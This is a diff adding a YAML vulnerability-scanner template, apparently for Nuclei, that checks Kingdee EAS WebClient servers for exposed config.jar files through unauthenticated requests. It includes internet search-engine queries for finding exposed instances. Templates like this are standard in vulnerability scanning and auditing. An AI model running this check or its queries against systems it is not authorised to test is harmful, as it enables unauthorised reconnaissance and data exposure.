@@ -1,0 +1,34 @@
+id: kingdee-eas-easWebClient-disclosure
+info:
+  name: 金蝶 EAS WebClient - disclosure
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - demo
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶")
+    hunter-query: web.body="/eassso/images/"
+    quake-query: app:"金蝶-EAS"
+    zoomeye-query: app:"金蝶 EAS"
+  tags: kingdee,hw,oa,disclosure,eas
+
+http:
+  - raw:
+      - |
+        GET /easWebClient/bin/lib/config.jar HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        GET /easWebClient/bin/config.jar HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'PK','FrmClientConfig')
+        condition: and
